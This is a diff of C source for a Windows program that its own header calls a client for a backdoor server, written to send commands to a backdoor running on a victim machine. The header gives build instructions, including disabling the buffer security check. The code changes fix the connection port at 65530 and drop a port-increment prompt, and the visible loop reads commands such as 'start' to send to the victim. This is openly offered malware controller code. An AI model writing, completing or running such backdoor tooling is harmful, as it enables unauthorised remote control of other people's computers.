@@ -1,3 +1,27 @@
+/*-------------------------------------------------------------------------------------------------
+ *
+ *      Sample        : Client for the backdoor server
+ *      Function      : Send commands to backdoor server in the victim machine
+ *      Requirement   : Server should be active in the victim to accept the commands
+ * 
+ *-----------------------------------------------------------------------------------------------
+ *
+ *        Best built in Visual Studio 10
+ *          Porject settings (Configuration Properties):
+ * 
+ *              1. C/C++ --> Advanced --> Calling convention
+ *                 Set __stdcall (Gz)
+ * 
+ *              2. C/C++ --> Code Generation --> Buffer Security Check
+ *                 Set NO
+ * 
+ *              3. Linker --> General --> Enable Incremental Linking
+ *                 Set NO
+ * 
+ *              4. Linker --> System --> SubSystem
+ *                 Set CONSOLE
+ *
+ *-----------------------------------------------------------------------------------------------*/
 #include <stdio.h>
 #include <Windows.h>
 
@@ -59,19 +83,13 @@ int main(int argc,char* argv[])
 
 	sai.sin_family=AF_INET;
 	sai.sin_addr=*((LPIN_ADDR)*host->h_addr_list);
-	//sai.sin_port=htons(65530);
-	int s = 65530;
-	//sai.sin_port=htons(65532);
+	sai.sin_port=htons(65530);
 
 	while(1)
 	{
-		int inc = 0;
-		printf("Increament:");
-		scanf("%d", &inc);
-		sai.sin_port=htons(s+inc);
 		memset(&data,0,sizeof(data));
 		
-		printf("\nEnter command (%d): ", (s+inc));
+		printf("\nEnter command: ");
 		scanf("%s",cmd);
 
 		if(!stricmp("start",cmd))
